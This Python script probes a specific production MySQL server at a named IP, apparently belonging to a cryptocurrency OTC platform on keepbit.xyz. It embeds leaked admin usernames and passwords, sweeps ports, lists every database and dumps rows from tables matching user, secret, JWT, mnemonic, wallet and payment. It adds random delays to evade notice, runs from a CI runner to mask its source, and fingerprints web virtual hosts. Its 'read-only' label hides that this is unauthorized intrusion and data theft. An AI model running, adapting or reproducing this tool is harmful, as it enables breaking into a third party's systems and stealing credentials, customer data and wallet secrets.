#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
otc_mysql_probe.py - read-only probe of OTC production MySQL 124.243.183.235:9527
run from GitHub Actions runner egress (asdmd1992/egress-probe-8755).

ONLY read-only operations (SELECT / SHOW / DESCRIBE). Low rate with random
sleeps between network actions (hint 5076). Never writes to the target.

Usage:
  python3 otc_mysql_probe.py --ip 124.243.183.235 --port 9527 \
      --creds 'otcAdmin:k1U$DTTbVWj,testAdmin:5w!f9Lf68&C9' \
      --hosts 'keepbit.xyz,testspeech.keepbit.xyz,testalk.keepbit.xyz,grafana.keepbit.xyz'
"""
import argparse, random, socket, subprocess, sys, time

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
SKIP_DBS = {"information_schema", "performance_schema", "mysql", "sys"}
INTERESTING = ("user", "admin", "config", "setting", "secret", "key", "jwt",
               "token", "merchant", "mch", "order", "wallet", "address",
               "mnemonic", "coin", "balance", "transfer", "payment", "app",
               "member", "customer", "role", "permission", "sys", "account",
               "bank", "card", "otc", "trade", "record", "log", "mobile")


def log(*a):
    print(*a, flush=True)


def pause(lo=8, hi=15):
    time.sleep(random.uniform(lo, hi))


def tcp_open(ip, port, timeout=8):
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            return True
    except Exception as e:
        return False


def http_probe(url, host, timeout=20):
    """curl-based HTTPS probe with Host header. Returns (code, server_hdr, title, body_len, head_snip)."""
    cmd = ["curl", "-sk", "--max-time", str(timeout), "-A", UA, "-H", "Host: " + host,
           "-w", "\n[HTTP:%{http_code} len:%{size_download} time:%{time_total}]", "-D", "-"]
    cmd.append(url)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 10)
        out = r.stdout or ""
    except Exception as e:
        return "000", "", "", 0, repr(e)[:150]
    head = out.split("\r\n\r\n", 1)[0] if "\r\n\r\n" in out else out[:500]
    body = out.split("\r\n\r\n", 1)[1] if "\r\n\r\n" in out else ""
    code = "000"
    for line in head.splitlines():
        if line.lower().startswith("http/"):
            code = line.split()[1]
    server = ""
    for line in head.splitlines():
        if line.lower().startswith("server:"):
            server = line.split(":", 1)[1].strip()
    import re
    m = re.search(r"<title[^>]*>(.*?)</title>", body, re.I | re.S)
    title = m.group(1).strip()[:120] if m else ""
    tail = out.splitlines()[-1] if out.splitlines() else ""
    return code, server, title, len(body), tail


def mysql_connect(ip, port, user, pwd, timeout=15):
    try:
        import pymysql
        conn = pymysql.connect(host=ip, port=port, user=user, password=pwd,
                               connect_timeout=timeout, read_timeout=timeout,
                               charset="utf8mb4", autocommit=True)
        return conn, None
    except Exception as e:
        return None, repr(e)[:300]


def q(cur, sql):
    try:
        cur.execute(sql)
        return cur.fetchall()
    except Exception as e:
        return [("ERR", str(e)[:200])]


def trunc(v, n=300):
    s = str(v)
    return s if len(s) <= n else s[:n] + "...<trunc>"


def probe_mysql(ip, port, user, pwd):
    log(f"\n===== MySQL {ip}:{port} user={user} =====")
    conn, err = mysql_connect(ip, port, user, pwd)
    if conn is None:
        log(f"[AUTH/UNREACH] {err}")
        return
    log(f"[CONNECTED] user={user}@{ip}:{port}")
    cur = conn.cursor()
    try:
        for sql, label in [
            ("SELECT VERSION(), @@hostname, @@port", "server"),
            ("SHOW DATABASES", "dbs"),
        ]:
            rows = q(cur, sql)
            log(f"[{label}] {rows}")
        pause(3, 6)
        # normalize dbs from SHOW DATABASES result
        dbs = []
        for r in q(cur, "SHOW DATABASES"):
            if r and r[0] not in SKIP_DBS:
                dbs.append(r[0])
        log(f"[DBLIST] {dbs}")
        for db in dbs:
            pause(2, 5)
            log(f"\n--- db: {db} ---")
            tabs = [r[0] for r in q(cur, f"SHOW TABLES FROM `{db}`")]
            log(f"[TABLES:{db}] total={len(tabs)}")
            for t in tabs:
                if any(k in t.lower() for k in INTERESTING):
                    log(f"  * {t}")
            # inspect interesting tables
            for t in tabs:
                tl = t.lower()
                if not any(k in tl for k in INTERESTING):
                    continue
                try:
                    cnt = q(cur, f"SELECT COUNT(*) FROM `{db}`.`{t}`")
                    log(f"[CNT] {db}.{t} = {cnt}")
                except Exception:
                    continue
                if any(k in tl for k in ("user", "admin", "account", "member", "merchant", "mch", "customer")):
                    try:
                        cur.execute(f"SELECT * FROM `{db}`.`{t}` LIMIT 3")
                        cols = [d[0] for d in cur.description]
                        rows2 = cur.fetchall()
                        log(f"[ROW] {db}.{t} cols={cols}")
                        for r2 in rows2:
                            log(f"  {[trunc(c) for c in r2]}")
                    except Exception as e:
                        log(f"  select_err: {str(e)[:150]}")
                elif any(k in tl for k in ("config", "setting", "secret", "key", "jwt", "app")):
                    try:
                        cur.execute(f"SELECT * FROM `{db}`.`{t}` LIMIT 20")
                        cols = [d[0] for d in cur.description]
                        rows2 = cur.fetchall()
                        log(f"[CFG] {db}.{t} cols={cols}")
                        for r2 in rows2:
                            log(f"  {[trunc(c, 200) for c in r2]}")
                    except Exception as e:
                        log(f"  select_err: {str(e)[:150]}")
                elif any(k in tl for k in ("mnemonic", "wallet", "address", "transfer", "order", "balance", "coin", "payment", "trade")):
                    try:
                        cur.execute(f"SELECT * FROM `{db}`.`{t}` LIMIT 2")
                        cols = [d[0] for d in cur.description]
                        rows2 = cur.fetchall()
                        log(f"[BIZ] {db}.{t} cols={cols}")
                        for r2 in rows2:
                            log(f"  {[trunc(c, 250) for c in r2]}")
                    except Exception as e:
                        log(f"  select_err: {str(e)[:150]}")
                pause(1, 3)
    finally:
        conn.close()
    log(f"[DONE] user={user}")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--ip", default="124.243.183.235")
    ap.add_argument("--port", type=int, default=9527)
    ap.add_argument("--creds", default="otcAdmin:k1U$DTTbVWj")
    ap.add_argument("--hosts", default="keepbit.xyz,testspeech.keepbit.xyz,testalk.keepbit.xyz,grafana.keepbit.xyz")
    ap.add_argument("--no-vhost", action="store_true")
    args = ap.parse_args()

    log(f"### otc_mysql_probe start ip={args.ip} port={args.port}")

    # 1. TCP reachability sweep (cheap, read-only)
    ports = [22, 80, 443, 3306, 6379, 8080, 9527]
    log("[TCP] " + json_dumps({p: tcp_open(args.ip, p) for p in ports}))

    # 2. MySQL auth attempts
    creds = [c.split(":", 1) for c in args.creds.split(",") if ":" in c]
    for user, pwd in creds:
        probe_mysql(args.ip, args.port, user, pwd)
        pause()

    # 3. 443 vhost fingerprint
    if not args.no_vhost:
        log("\n===== HTTPS vhost fingerprint =====")
        for h in [x.strip() for x in args.hosts.split(",") if x.strip()]:
            code, server, title, blen, tail = http_probe(f"https://{args.ip}/", h)
            log(f"[VHOST] {h} -> code={code} server={server} title={title!r} body_len={blen} tail={tail}")
            pause()

    log("\n### otc_mysql_probe end")


def json_dumps(o):
    import json
    return json.dumps(o)


if __name__ == "__main__":
    main()
